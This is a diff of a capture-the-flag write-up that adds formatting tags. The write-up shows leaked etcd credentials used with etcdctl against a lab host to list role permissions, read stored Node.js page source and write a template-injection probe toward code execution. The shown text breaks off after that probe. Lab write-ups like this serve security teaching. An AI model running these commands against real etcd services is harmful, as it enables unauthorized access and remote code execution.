@@ -45,10 +45,10 @@ Using this vulnerability we care able to view leaked credentials for authenticat
 ![Leaked Creds](https://raw.githubusercontent.com/theMcSam/echoCTF-writeups/refs/heads/main/etceterad/images/leaked_creds_from_etctd_vuln.png)
 
 To be able to hack `etcd` we must first understand what it is. `etcd` is a distributed key-value store used to store configuration data and coordinate distributed systems. Effectively, `etcd` acts as a database where clients can query data from the server in a distributed environment.
-
+<br>
 We can interract with `etcd` buy using the client software called `etcdctl`.
 First of all we will have to install the tool if it's not available on current attack machine.
-
+<br>
 After installing it we can now interact with the `etcd`.
 We first send a query to get information about out current user.
 
@@ -57,7 +57,7 @@ mcsam@0x32:~/$ ETCDCTL_API=3 etcdctl --user nodejs:sjedon --endpoints http://10.
 User: nodejs
 Roles: etsctf
 ```
-
+<br>
 From the above query we can see that we have the role `etsctf`. Now we try to see what permissions are available for this role and what we can achieve with it.
 ```
 mcsam@0x32:~/$ ETCDCTL_API=3 etcdctl --user nodejs:sjedon --endpoints http://10.0.160.122:2379 role get etsctf
@@ -71,14 +71,16 @@ KV Write:
 	[/home/, /home0) (prefix /home/)
 	[/nodejs/, /nodejs0) (prefix /nodejs/)
 ```
-    
-From the above results users with the role `etsctf` can read and write to the `/home` and `/nodejs` prefixes.
 
+From the above results users with the role `etsctf` can read and write to the `/home` and `/nodejs` prefixes.
+<br>
 We will attempt to view the keys under the `/nodejs` prefix.
 ```
 mcsam@0x32:~/$ ETCDCTL_API=3 etcdctl --user nodejs:sjedon --endpoints http://10.0.160.122:2379 get --prefix "/nodejs/" --keys-only
 /nodejs/index
 ```
+
+<br>
 
 Viewing the value stored in the "/nodejs/index" key.
 ```
@@ -101,10 +103,10 @@ mcsam@0x32:~/$ ETCDCTL_API=3 etcdctl --user nodejs:sjedon --endpoints http://10.
       </body>
 </html>
 ```
-
+<br>
 From the content of the `/nodejs/index` key we observe and find out that it is the source code for the web site we saw earlier running on port `1337`. Furthermore, we can also see that the source code does some server side rendering and hence may be vulnerable to SSTI. From our initial Nmap scan, nmap reported that the service running on port `1337` was powered by Node.js (Express middleware). This can guide us to know the kind of code to execute inorder to obtain RCE.
-
-Testing our theory.
+<br>
+### Testing our theory.
 Since we have write access to `/nodejs/index` key we will write our own content to verify if we can obtain code exeuction. Payload: `Bingo: <%= 7*7 %>`
 ```
 mcsam@0x32:~/$ ETCDCTL_API=3 etcdctl --user nodejs:sjedon --endpoints http://10.0.160.122:2379 put "/nodejs/index" "Bingo: <%= 7*7 %>" 
